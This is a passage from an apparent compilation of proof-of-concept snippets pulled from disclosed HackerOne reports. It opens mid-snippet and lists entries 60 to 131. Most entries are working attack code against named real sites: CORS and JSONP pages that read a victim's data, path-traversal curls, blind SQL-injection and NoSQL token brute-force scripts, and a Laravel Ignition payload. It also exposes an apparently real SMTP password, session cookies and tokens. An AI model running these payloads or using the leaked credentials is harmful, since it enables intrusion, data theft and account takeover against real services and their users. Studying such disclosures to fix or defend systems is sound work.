var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://app.upchieve.org/api/user',true); req.withCredentials = true; req.send('{}'); function reqListener() { alert(this.responseText); };
</script>
```

## 60. [#3000510](https://hackerone.com/reports/3000510)  -  The /reports/:id.json endpoint discloses potentially sensitive user attributes when reporter summary is present
*critical*

```http
GET /reports/█████.json HTTP/2
Host: hackerone.com
```

## 61. [#2382120](https://hackerone.com/reports/2382120)  -  Creation of bounties through Customer API leads to private email disclosure
*critical*

```
let inputBody = "{\n  \"data\": {\n    \"type\": \"bounty\",\n    \"attributes\": {\n      \"recipient_id\": \"██████████\",\n          \"amount\": 51,\n      \"reference\": \"newbounty\",\n      \"title\": \"BOUNTY FROM Sandbox\",\n      \"currency\": \"USD\",\n      \"severity_rating\": \"high\"\n    }\n  }\n}";
let user = 'identifier';
let password = 'token';
let headers = new Headers();
headers.set('Authorization', 'Basic ' + btoa(user + ":" + password));
  headers.set('Content-Type', 'application/json');  headers.set('Accept', 'application/json');

fetch('https://api.hackerone.com/v1/programs/{id}/bounties',
{
  method: 'POST',
  body: inputBody,
  headers: headers
})
.then(function(res) {
    return res.json();
}).then(function(body) {
    console.log(body);
});
```

## 62. [#894110](https://hackerone.com/reports/894110)  -  h1-ctf writeup , finally paid the payments by chaining multiple bugs
*critical*

```http
POST / HTTP/1.1
Host: app.bountypay.h1ctf.com

username=brian.oliver&password=V7h0inzX&challenge=4810310b2c844799dc9c9d46d3838192&challenge_answer=fake
```

## 63. [#894110](https://hackerone.com/reports/894110)  -  h1-ctf writeup , finally paid the payments by chaining multiple bugs
*critical*

```http
GET /api/staff HTTP/1.1
Host: api.bountypay.h1ctf.com

_______________________________ Response __________________________________
```

## 64. [#894110](https://hackerone.com/reports/894110)  -  h1-ctf writeup , finally paid the payments by chaining multiple bugs
*critical*

```http
GET /admin/report?url=Lz90ZW1wbGF0ZT1ob21l HTTP/1.1
Host: staff.bountypay.h1ctf.com
Cookie: token=c0lsdUV............
```

## 65. [#894110](https://hackerone.com/reports/894110)  -  h1-ctf writeup , finally paid the payments by chaining multiple bugs
*critical*

```http
POST /?template=home HTTP/1.1
Host: staff.bountypay.h1ctf.com
Cookie: token=c0lsdUV....

profile_name=sandra&profile_avatar=tab4 upgradeToAdmin
```

## 66. [#1551588](https://hackerone.com/reports/1551588)  -  CVE-2022-27775: Bad local IPv6 connection reuse
*low, $480*

```
Listening on :: 9999
Connection received on somehost someport
GET /x HTTP/1.1
Host: [ipv6addr]:9999
User-Agent: curl/7.83.0-DEV
Accept: */*

GET /y HTTP/1.1
Host: [ipv6addr]:9999
User-Agent: curl/7.83.0-DEV
Accept: */*
```

## 67. [#361951](https://hackerone.com/reports/361951)  -  Exploiting JSONP callback on /username/charts.json endpoint leads to information disclosure despite user's privacy settings
*medium*

```html
<script src="https://liberapay.com/~153779/charts.json?callback=rip"></script>
```

## 68. [#2032716](https://hackerone.com/reports/2032716)  -  An attacker can can view any hacker email via  /SaveCollaboratorsMutation operation name
*high, $12,500*

```http
POST /graphql HTTP/2
Host: hackerone.com

[sinp]

{"operationName":"SaveCollaboratorsMutation","variables":{"input":{"report_id":2032701,"collaborators":[{"username_or_email":"testmealways","bounty_weight":0.9989999999999999},{"username_or_email":"███████","bounty_weight":0.9989999999999999},{"username_or_email":"███████","bounty_weight":0.9989999999999999}]},"product_area":"collaboration","product_feature":"save_collaborators"},"query":"mutation SaveCollaboratorsMutation($input: SaveCollaboratorsMutationInput!) {\n  saveCollaborators(input: $input) {\n    was_successful\n    errors {\n      edges {\n        node {\n          message\n          __typename\n        }\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n}\n"}
```

## 69. [#2032716](https://hackerone.com/reports/2032716)  -  An attacker can can view any hacker email via  /SaveCollaboratorsMutation operation name
*high, $12,500*

```http
POST /graphql HTTP/2
Host: hackerone.com

[sinp]
```

## 70. [#2107680](https://hackerone.com/reports/2107680)  -  AWS keys and user cookie leakage via uninitialized memory leak in outdated librsvg version in Basecamp
*high, $8,868*

```
X_REAL_IP: █████
X_FORWARDED_FOR: ████████, ███
HOST: ████████
X_QUEUE_START: 1690786808.173
CONNECTION: close
COOKIE: █████
█████████%██████%2BVxMClK5d1rjoLKbCyFnKab9lI2lZ9sLvGW%2BT60xsygpl6syYIfVHK73km9DT98ecq0JD68OBnI9EdzLcEdmI5%2BXr%2FuOZ5BeUMoX--kvDVySR7oaYSGdHy--RU8uCFyrq8mPCjEvyX38OA%3D%3D; _csrf_token=KHczIU3KBHe%2FJjVhpFWn48FJ2vtYha4YdwUvXdypO51h5iLa4XvkjqaX0XYtzy7fOJahGGN40mfq8GMEN0v1t0SqEnfJUY%2F7CY1mVVSs9EuAFK8wF4Wrh5jA9jk4sen8KDEDXq7sjAMjdnsLLzIjL0LYLG8P8%2FsZz2BHy95JB9JTSsyPleUI--MLV2RZiAHIJrVXv%2F--rQLRhEgWWYGfXxRmqL%2B%2Frw%3D%3D; authenticity_token=████; color_scheme=none; bc3_session_verification_token=0187762ee195d9bdbb1c; bc3_identity_id=eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHBCSTBqYXdFPSIsImV4cCI6bnVsbCwicHVyIjoiY29va2llLmJjM19pZGVudGl0eV9pZCJ9fQ%3D%3D--957bc8a13ea3ae13b00792f0fecaa58f046a791b
ACCEPT: application/json
X_REQUESTED_WITH: XMLHttpRequest
ACCEPT_LANGUAGE: de-DE,de;q=0.9
IF_NONE_MATCH: W/"77ae6ae7dd96d1bac74baed254a6ab62"
USER_AGENT: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15
REFERER: █████
X_FETCH_TYPE: native
X_CSRF_TOKEN: ██████████
X_FORWARDED_PROTO: https
X_FORWARDED_PORT: 443
```

## 71. [#697512](https://hackerone.com/reports/697512)  -  Information Disclosure through Sentry Instance ███████
*high, $750*

```http
POST /api/20/store██████ HTTP/1.1
Host: ███
```

## 72. [#1007988](https://hackerone.com/reports/1007988)  -  Able to comment/view in others support ticket at https://en.instagram-brand.com/requests/dashboard
*high*

```http
POST /wp-json/brc/v1/approval-requests/44799/comments HTTP/1.1
```

## 73. [#1183601](https://hackerone.com/reports/1183601)  -  Cross-origin resource sharing misconfig | steal user information
*high*

```http
GET /api/user HTTP/1.1
Host: app.upchieve.org
```

## 74. [#1183601](https://hackerone.com/reports/1183601)  -  Cross-origin resource sharing misconfig | steal user information
*high*

```http
GET /api/user HTTP/1.1
Host: app.upchieve.org
Origin: evil.com
```

## 75. [#1183601](https://hackerone.com/reports/1183601)  -  Cross-origin resource sharing misconfig | steal user information
*high*

```html
<html>
<script>
var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://app.upchieve.org/api/user',true); req.withCredentials = true; req.send('{}'); function reqListener() { alert(this.responseText); };
</script>
</html>
```

## 76. [#1183601](https://hackerone.com/reports/1183601)  -  Cross-origin resource sharing misconfig | steal user information
*high*

```http
GET /api/user HTTP/1.1
Host: app.upchieve.org

'''
```

## 77. [#838817](https://hackerone.com/reports/838817)  -  Insecure crossdomain.xml on https://vdc.mtnonline.com/
*high*

```xml
<?xml version="1.0"?>
<!DOCTYPE cross-domain-policy SYSTEM "http://www.adobe.com/xml/dtds/cross-domain-policy.dtd">
	<cross-domain-policy>    
	<site-control permitted-cross-domain-policies="all"/>    
	<allow-access-from domain="*"  secure="false" to-ports="*"/>
	<allow-http-request-headers-from domain="*" headers="*"/> 
	</cross-domain-policy>
```

## 78. [#792998](https://hackerone.com/reports/792998)  -  404-response contains debug-information with all headers
*low*

```
HTTP/1.1 404 Not Found
Date: Tue, 11 Feb 2020 08:29:55 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
P3p: CP="NOI ADM DEV PSAi COM NAV OUR OTRo STP IND DEM"
Referrer-Policy: unsafe-url
X-Content-Type-Options: nosniff
X-Xss-Protection: 1; mode=block
CF-Cache-Status: DYNAMIC
Expect-CT: max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
Server: cloudflare
CF-RAY: 5634f5362977d147-GOT
Content-Length: 6334

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
    <head>
    	<title>Page Not Found (404)</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">        <link href="https://fonts.googleapis.com/css?family=Lato:300|Montserrat:300,400" rel="stylesheet" type="text/css">
    	<style>
			body, html {margin:0;background:#252525;}
            body{padding:7% 20%;font-family: "Montserrat",sans-serif;}
			h1{color:#4b4b4b;font-size:55px;margin:0 0 8px;font-weight:400;}
            div{border-top:1px solid #4b4b4b;width: 40px;height:1px;margin:0 0 45px -20px;}
            h2{color:#fff;font-size:22px;margin-bottom:12px;font-weight:300;}
            p{color:#ddd;font-size:18px;margin-bottom:60px; font-family: "Lato",sans-serif;font-weight:300}
		</style>
    </head>          
    <body>
		<h1>404</h1>
        <div></div>
        <h2>Hey, we can't find what you're looking for...</h2>
        <p>The requested URL doesn't exist.</p>
        <pre id="debugData" style="display: none;">
# … truncated …
```

## 79. [#978143](https://hackerone.com/reports/978143)  -  Team object in GraphQL disclosed private_comment
*medium, $2,500*

```http
POST:

`{"query":"query { node(id: \\"gid://hackerone/SurveyRatingItem/█████\\") { ... on SurveyRatingItem{_id,pentester{_id},team{_id},key,private_comment,public_comment,rating,recipient{username,email},subject{... on Report{_id}},survey_rating{_id,team{_id},state,respondent{_id,username,email,pentests{nodes{_id}}}}}}}","variables":{}}`
```

## 80. [#2421796](https://hackerone.com/reports/2421796)  -  Possible PII Disclosure via Advanced Vetting Process - ██████
*medium, $2,500*

```http
GET /█████/terms_acceptance_data.csv HTTP/2
Host: hackerone.com
Cookie: XXXXX
```

## 81. [#882412](https://hackerone.com/reports/882412)  -  OrderListInitial leaks order details
*medium, $1,500*

```http
POST /admin/internal/web/graphql/core HTTP/1.1
```

## 82. [#871749](https://hackerone.com/reports/871749)  -  Unauthorized access to metadata of undisclosed reports that were retested
*medium*

```http
POST /graphql HTTP/1.1
Host: hackerone.com

'''
```

## 83. [#707433](https://hackerone.com/reports/707433)  -  Disclosure of `payment_transactions` for programs via GraphQL query
*medium*

```http
POST /graphql? HTTP/1.1
Host: hackerone.com

{"query":"query Team_mini_profile($handle_0:String!,$size_1:ProfilePictureSizes!) {team(handle:$handle_0) {id,...F0}} fragment F0 on Team {id,name,about,_profile_picturePkPpF:profile_picture(size:$size_1),offers_swag,offers_bounties,base_bounty,payment_transactions{total_count}}","variables":{"handle_0":"████","size_1":"small"}}
```

## 84. [#800231](https://hackerone.com/reports/800231)  -  GraphQL node interface for ActiveResource models lacks encoding for resource identifier, enabling parameter injection in Payments backend
*medium*

```http
GET /payments/1 HTTP/1.1
```

## 85. [#800231](https://hackerone.com/reports/800231)  -  GraphQL node interface for ActiveResource models lacks encoding for resource identifier, enabling parameter injection in Payments backend
*medium*

```http
GET /payments/something HTTP/1.1
```

## 86. [#800231](https://hackerone.com/reports/800231)  -  GraphQL node interface for ActiveResource models lacks encoding for resource identifier, enabling parameter injection in Payments backend
*medium*

```http
GET /payments/1.json HTTP/1.1
```

## 87. [#800231](https://hackerone.com/reports/800231)  -  GraphQL node interface for ActiveResource models lacks encoding for resource identifier, enabling parameter injection in Payments backend
*medium*

```http
GET /payments/?core_hacker_username=jobert&core_team_handle=security%26.json HTTP/1.1
```

## 88. [#800231](https://hackerone.com/reports/800231)  -  GraphQL node interface for ActiveResource models lacks encoding for resource identifier, enabling parameter injection in Payments backend
*medium*

```http
GET /payments/%3fsomething%26.json HTTP/1.1
```

## 89. [#800231](https://hackerone.com/reports/800231)  -  GraphQL node interface for ActiveResource models lacks encoding for resource identifier, enabling parameter injection in Payments backend
*medium*

```http
GET /payments/?something&.json HTTP/1.1
```

## 90. [#361951](https://hackerone.com/reports/361951)  -  Exploiting JSONP callback on /username/charts.json endpoint leads to information disclosure despite user's privacy settings
*medium*

```html
<script>
function rip(a) {

alert(JSON.stringify(a[1]));

}
</script>
<script src="https://liberapay.com/~153779/charts.json?callback=rip"></script>
```

## 91. [#2108342](https://hackerone.com/reports/2108342)  -  Error when editing a calendar appointment returns stacktrace and query
*medium*

```http
PUT /nextcloud/index.php/apps/calendar/v1/appointment_configs/3 HTTP/1.1
Host: localhost

{"id":3,"token":"scjGreGCEkTQ","name":"abc","description":"","location":"","visibility":"PRIVATE","targetCalendarUri":"personal","availability":{"timezoneId":"Asia/Riyadh","slots":{"MO":[{"start":1691992800,"end":1692021600}],"TU":[{"start":1691992800,"end":1692021600}],"WE":[{"start":1691992800,"end":1692021600}],"TH":[{"start":1691992800,"end":1692021600}],"FR":[{"start":1691992800,"end":1692021600}],"SA":[],"SU":[]}},"length":300,"increment":900,"preparationDuration":0,"followupDuration":0,"timeBeforeNextSlot":0,"futureLimit":5184000,"calendarFreeBusyUris":[]}
```

## 92. [#2108342](https://hackerone.com/reports/2108342)  -  Error when editing a calendar appointment returns stacktrace and query
*medium*

```http
PUT /nextcloud/index.php/apps/calendar/v1/appointment_configs/3 HTTP/1.1
Host: localhost
```

## 93. [#1605962](https://hackerone.com/reports/1605962)  -  store internal email disclosed through shopify-data-exporter
*medium*

```http
GET /?shop=your_store.myshopify.com HTTP/2
Host: shopify-data-exporter.shopifycloud.com
```

## 94. [#901775](https://hackerone.com/reports/901775)  -  Get analytics token using only apps permission
*medium*

```http
POST /validate?beta=true&dataOnly=false HTTP/1.1
Host: analytics.shopify.com
Content-Type: application/x-www-form-urlencoded;charset=UTF-8
Origin: https://foobar.myshopify.com
```

## 95. [#850447](https://hackerone.com/reports/850447)  -  gitlab-workhorse bypass in Gitlab::Middleware::Multipart allowing files in `allowed_paths` to be read
*critical, $10,000*

```bash
$ curl -g -XPOST -v -H "Authorization: Bearer $TOKEN" 'http://gitlab-vm.local/api/v4/projects/171/wikis/attachments?file.path=/tmp/ggg' -F '[file]=@/tmp/lala.txt'`
{"file_name":"ggg","file_path":"uploads/58ec1627b3f14eba0a16659fd859da63/ggg","branch":"master","link":{"url":"uploads/58ec1627b3f14eba0a16659fd859da63/ggg","markdown":"[ggg](uploads/58ec1627b3f14eba0a16659fd859da63/ggg)"}}
```

## 96. [#308721](https://hackerone.com/reports/308721)  -  [serve] Directory listing and File access even when they have been set to be ignored.
*critical*

```bash
$ curl http://localhost:1337/test.txt
Not Found
```

## 97. [#308721](https://hackerone.com/reports/308721)  -  [serve] Directory listing and File access even when they have been set to be ignored.
*critical*

```bash
$ curl http://localhost:1337/t%65st.txt
this is a forbidden file :D
```

## 98. [#308721](https://hackerone.com/reports/308721)  -  [serve] Directory listing and File access even when they have been set to be ignored.
*critical*

```bash
$ curl http://localhost:1337/testfolder/
Not Found
```

## 99. [#308721](https://hackerone.com/reports/308721)  -  [serve] Directory listing and File access even when they have been set to be ignored.
*critical*

```html
$ curl http://localhost:1337/t%65stfolder/
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Files within testserve/testfolder/</title>
      .
      .
          <li>
            <a href="/testfolder/testfile.txt" title="testfile.txt" class="txt">testfile.txt</a>
            <i>31 B</i>
          </li>
      .
      .
```

## 100. [#308721](https://hackerone.com/reports/308721)  -  [serve] Directory listing and File access even when they have been set to be ignored.
*critical*

```bash
$ curl http://localhost:1337/t%65stfolder/testfile.txt
this is a test ... forbidden !
```

## 101. [#486933](https://hackerone.com/reports/486933)  -  [serve] Access unlisted internal files/folders revealing sensitive information
*critical*

```bash
$ curl http://localhost:5000/.git --path-as-is     
404 Not Found
$ curl http://localhost:5000/secret --path-as-is
404 Not Found
```

## 102. [#330650](https://hackerone.com/reports/330650)  -  [serve] Directory listing and File access even when they have been set to be ignored
*critical*

```bash
$ curl --path-as-is 'http://127.0.0.1:6060/secret.html'
Not Found
```

## 103. [#330650](https://hackerone.com/reports/330650)  -  [serve] Directory listing and File access even when they have been set to be ignored
*critical*

```bash
$ curl --path-as-is 'http://127.0.0.1:6060/s%65cret.html'
Not Found
```

## 104. [#330650](https://hackerone.com/reports/330650)  -  [serve] Directory listing and File access even when they have been set to be ignored
*critical*

```bash
$ curl --path-as-is 'http://127.0.0.1:6060/sECret.html'
This is secret content!!
```

## 105. [#330724](https://hackerone.com/reports/330724)  -  [serve] Directory listing and File access even when they have been set to be ignored (using dot-slash)
*critical*

```bash
$ curl --path-as-is 'http://127.0.0.1:6060/dir/secret.txt'
Not Found
```

## 106. [#330724](https://hackerone.com/reports/330724)  -  [serve] Directory listing and File access even when they have been set to be ignored (using dot-slash)
*critical*

```bash
$ curl --path-as-is 'http://127.0.0.1:6060/dir/dir2/'
Not Found
```

## 107. [#330724](https://hackerone.com/reports/330724)  -  [serve] Directory listing and File access even when they have been set to be ignored (using dot-slash)
*critical*

```bash
$ curl --path-as-is 'http://127.0.0.1:6060/dir/s%65cret.txt'
Not Found
```

## 108. [#330724](https://hackerone.com/reports/330724)  -  [serve] Directory listing and File access even when they have been set to be ignored (using dot-slash)
*critical*

```bash
$ curl --path-as-is 'http://127.0.0.1:6060/dir/./secret.txt'
This is secret content!!
```

## 109. [#1068434](https://hackerone.com/reports/1068434)  -  HackyHolidays 2020 Full Write-up: Information Disclosure of 12 Flags
*critical*

```bash
$ curl https://hackyholidays.h1ctf.com/swag-shop/api/user?uuid=C7DCCE-0E0DAB-B20226-FC92EA-1B9043
{"uuid":"C7DCCE-0E0DAB-B20226-FC92EA-1B9043","username":"grinch","address":{"line_1":"The Grinch","line_2":"The Cave","line_3":"Mount Crumpit","line_4":"Whoville"},"flag":"flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}"}%
```

## 110. [#1068434](https://hackerone.com/reports/1068434)  -  HackyHolidays 2020 Full Write-up: Information Disclosure of 12 Flags
*critical*

```bash
$ curl -s https://hackyholidays.h1ctf.com/my-diary/?template=secretadsecretaadmin.phpdmin.phpmin.php | grep flag
    <h4 class="text-center">flag{18b130a7-3a79-4c70-b73b-7f23fa95d395}</h4>
```

## 111. [#1069171](https://hackerone.com/reports/1069171)  -  [H1 hackyholidays] CTF Writeup
*critical*

```bash
$ curl https://hackyholidays.h1ctf.com/secure-login -H "cookie: securelogin=eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjp0cnVlfQ%3d%3d"
```

## 112. [#1069171](https://hackerone.com/reports/1069171)  -  [H1 hackyholidays] CTF Writeup
*critical*

```bash
$ wget https://hackyholidays.h1ctf.com/my_secure_files_not_for_you.zip -O /tmp/data.zip && unzip /tmp/data.zip
```

## 113. [#2580062](https://hackerone.com/reports/2580062)  -  NoSQL injection leaks visitor token and livechat messages
*medium*

```javascript
var pool = "0123456789abcdef";
var rate_limit = 4; // requests per second

var guessVisitorToken = (knownValid, guesses) => {
  return new Promise((resolve, reject) => {
    if (!guesses.length) {
      return reject();
    }
    const guess = { "$regex": `^${knownValid}[${guesses}]` };
    console.log("Meteor.call", "livechat:loginByToken", guess);
    Meteor.call("livechat:loginByToken", guess, async (err, data) => {
      await new Promise((resolve) => setTimeout(() => resolve(), (1000 / rate_limit)));
      if (err) {
        console.error(err);
        return reject(err);
      }
      if ((data instanceof Object) && data.hasOwnProperty("_id")) {
        resolve(guesses)
      } else {
        reject();
      }
    });
  });
};

var bruteforceVisitorToken = async (knownValid="") => {

  let remainingPool = pool;
  while (true) {
    await new Promise((resolve) => setTimeout(() => resolve(), (1000 / rate_limit)));
    if (remainingPool.length === 0) {
      throw new Error("empty pool");
    } else if (remainingPool.length === 1) {
      await guessVisitorToken(knownValid, remainingPool);
      knownValid += remainingPool[0];
# … truncated …
```

## 114. [#2107680](https://hackerone.com/reports/2107680)  -  AWS keys and user cookie leakage via uninitialized memory leak in outdated librsvg version in Basecamp
*high, $8,868*

```python
def owner_id_before_type_cast();self.attribute_before_type_cast("owner_id");end;def organization_before_type_cast();self.attribute_before_type_cast("organization");end;def about_url_before_type_cast();self.attribute_before_type_cast("about_url");end;def client_id_before_type_cast();self.attribute_before_type_cast("client_id");end;def client_secret_before_type_cast();self.attribute_before_type_cast("client_secret");end;def redirect_uri_before_type_cast();self.attribute_before_type_cast("redirect_uri");end;def trusted_before_type_cast();self.attribute_before_type_cast("trusted");end;def scope_before_type_cast();self.attribute_before_type_cast("scope");end;def signing_secret_before_type_cast();self.attribute_before_type_cast("signing_secret");
```

## 115. [#490379](https://hackerone.com/reports/490379)  -  [glance] Access unlisted internal files/folders revealing sensitive information
*high*

```bash
$ curl --path-as-is 127.0.0.1:8080/.git
...
<title>File Not Found</title>
...
```

## 116. [#490379](https://hackerone.com/reports/490379)  -  [glance] Access unlisted internal files/folders revealing sensitive information
*high*

```bash
$ curl --path-as-is 127.0.0.1:8080/.git/HEAD      
ref: refs/heads/master
```

## 117. [#1049402](https://hackerone.com/reports/1049402)  -  PHP Info Exposing Secrets at https://radio.mtn.bj/info
*high*

```bash
$ python smtptest.py -v -u eba@gbdesignweb.com -p w?#h#DLkAPa7 no-reply@mtn.bj pudsec@wearehackerone.com camembert.o2switch.net
('usetls:', False)
('usessl:', False)
('from address:', 'no-reply@mtn.bj')
('to address:', 'pudsec@wearehackerone.com')
('server address:', 'camembert.o2switch.net')
('server port:', 25)
('smtp username:', 'eba@gbdesignweb.com')
smtp password: *****
('smtplib debuglevel:', 0)
-- Message body ---------------------
From: no-reply@mtn.bj
To: pudsec@wearehackerone.com
Subject: Test Message from smtptest at 2020-12-03 13:02:56

Test message from the smtptest tool sent at 2020-12-03 13:02:56
-------------------------------------
```

## 118. [#1069335](https://hackerone.com/reports/1069335)  -  How The Hackers Saved Christmas
*critical*

```
' or 1='1`, the answer will not be 1 or 0
```

## 119. [#1069175](https://hackerone.com/reports/1069175)  -  h1-ctf : 12 days of hack holiday writeup
*critical*

```python
import requests
from bs4 import BeautifulSoup
import base64
import string

charset = string.ascii_lowercase + string.digits

base_url ="https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=a' UNION SELECT \"2' UNION SELECT 1,1,'{}' --+-\",1,1--+-"

def get_username():
    username = ""
    while True:
        found_char_previous_run = False
        for char in charset:
            test_string = username + char
            path = "../api/user?username={}%25".format(test_string)
            url = base_url.format(path)
            if is_invalid_content_type(url):
                username += char 
                print(char, flush=True, end='')
                found_char_previous_run = True
                break
        
        if not found_char_previous_run:
            break
    return username

def get_password(username):
    password = ""
    while True:
        found_char_previous_run = False
        for char in charset:
            test_string = password + char
            path = "../api/user?username={}%26password={}%25".format(username, test_string)
            url = base_url.format(path)
# … truncated …
```

## 120. [#1069171](https://hackerone.com/reports/1069171)  -  [H1 hackyholidays] CTF Writeup
*critical*

```python
import requests as req
import string
from urllib.parse import urlencode, quote
import re

URL = 'https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59'

def get_endpoints():
  with open('objects-lowercase.txt', 'r') as f:
    endpoint = f.readline()
    while endpoint:
      endpoint = endpoint.lower().strip()
      res = send_sqli(endpoint)
      if res:
        print('{} => {}, {}'.format(endpoint, res['status_code'], res['text']))
      endpoint = f.readline()

def send_sqli(payload):
  print(payload)
  query = "' and 1=0 union select 1,2,'../api/{}' -- ".format(payload).encode('utf-8').hex()
  params = {
    'hash': "?hash='and 1=0 union select 0x{},2,3 -- ".format(query)
  }
  res = req.get(URL + '/album', params=params)
  match = re.search(r'/picture\?data=([A-Za-z0-9=]+)', res.text)
  if match:
    return call_api(match.group(1))
  print_and_exit('Empty response for ' + payload)

def call_api(data):
  res = req.get(URL + '/picture?data=' + data)
  if (not re.search(r'Received: 404', res.text)):
    return {
      'status_code': res.status_code,
      'text': res.text
    }

def print_and_exit(message):
  print(message)
  exit(0)
# … truncated …
```

## 121. [#1069171](https://hackerone.com/reports/1069171)  -  [H1 hackyholidays] CTF Writeup
*critical*

```
' or 1=1 -- `, the number of the users on the la
```

## 122. [#629892](https://hackerone.com/reports/629892)  -  Lack of CSRF header validation at https://g-mail.grammarly.com/profile
*medium*

```javascript
var xhttp = new XMLHttpRequest();
xhttp.onreadystatechange = function() {
   if (this.readyState == 4 && this.status == 200) {
       document.getElementById("response-node").innerHTML = this.responseText;
   }
};
xhttp.open("GET", "https://g-mail.grammarly.com/profile", true);
xhttp.withCredentials = true;
xhttp.send();
```

## 123. [#1424291](https://hackerone.com/reports/1424291)  -  Able to access private picture/video/writing when requesting for their JSON response
*medium*

```bash
curl https://fetlife.com/users/14104003/pictures/120041856 -H "Cookie: _fl_sessionid={your-session}" -H "Accept: application/json" --user-agent "not cur1"
```

## 124. [#1424291](https://hackerone.com/reports/1424291)  -  Able to access private picture/video/writing when requesting for their JSON response
*medium*

```bash
curl https://fetlife.com/users/14104003/videos/3102890 -H "Cookie: _fl_sessionid={your-session}" -H "Accept: application/json" --user-agent "not cur1"
```

## 125. [#1424291](https://hackerone.com/reports/1424291)  -  Able to access private picture/video/writing when requesting for their JSON response
*medium*

```bash
curl https://fetlife.com/users/14104003/posts/7673012 -H "Cookie: _fl_sessionid={your-session}" -H "Accept: application/json" --user-agent "not cur1"
```

## 126. [#2765259](https://hackerone.com/reports/2765259)  -  Information disclosure due to debug mode enabled at Laravel instance https://mpos.mtn.co.sz/
*medium*

```javascript
curl -XPOST -H 'Content-Type: application/json'  -d ‘{"solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution", "parameters": {"variableName": "test", "viewFile": "AA"}, }’  http(s)://mpos.mtn.co.sz/_ignition/execute-solution
```

## 127. [#2765259](https://hackerone.com/reports/2765259)  -  Information disclosure due to debug mode enabled at Laravel instance https://mpos.mtn.co.sz/
*medium*

```javascript
curl -XPOST -H 'Content-Type: application/json'  -d ‘{"solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution", "parameters": {"variableName": "test", "viewFile": "=50=00=44=00=39=00=77=00=61=00=48=00=41=00=67=00=58=00=31=00=39=00=49=00=51=00=55=00=78=00=55=00=58=00=30=00=4E=00=50=00=54=00=56=00=42=00=4A=00=54=00=45=00=56=00=53=00=4B=00=43=00=6B=00=37=00=49=00=44=00=38=00=2B=00=44=00=51=00=70=00=4E=00=41=00=51=00=41=00=41=00=41=00=67=00=41=00=41=00=41=00=42=..."}, }’  http(s)://mpos.mtn.co.sz/_ignition/execute-solution
```

## 128. [#3583983](https://hackerone.com/reports/3583983)  -  CVE-2026-3783: token leak with redirect and netrc
*medium*

```bash
python3 redirect_servers.py &
sleep 2
curl -v --oauth2-bearer "SECRET_TOKEN" --netrc-file /tmp/test-netrc -L http://127.0.0.1:8080/redirect
```

## 129. [#3583983](https://hackerone.com/reports/3583983)  -  CVE-2026-3783: token leak with redirect and netrc
*medium*

```bash
python3 redirect_servers.py &
sleep 2
curl -v -H "Authorization: Bearer SECRET_TOKEN" --netrc-file /tmp/test-netrc -L http://127.0.0.1:8080/redirect
```

## 130. [#3583983](https://hackerone.com/reports/3583983)  -  CVE-2026-3783: token leak with redirect and netrc
*medium*

```bash
python3 redirect_servers.py &
sleep 2
curl -v --oauth2-bearer "SECRET_TOKEN" -L http://127.0.0.1:8080/redirect
```

## 131. [#1176461](https://hackerone.com/reports/1176461)  -  CVE-2021-22898: TELNET stack contents disclosure
*medium*

```bash
curl -tNEW_ENV=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa,aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa -tNEW_ENV=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa,aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa -tNEW_ENV=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa,aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa -tNEW_ENV=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa,aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa 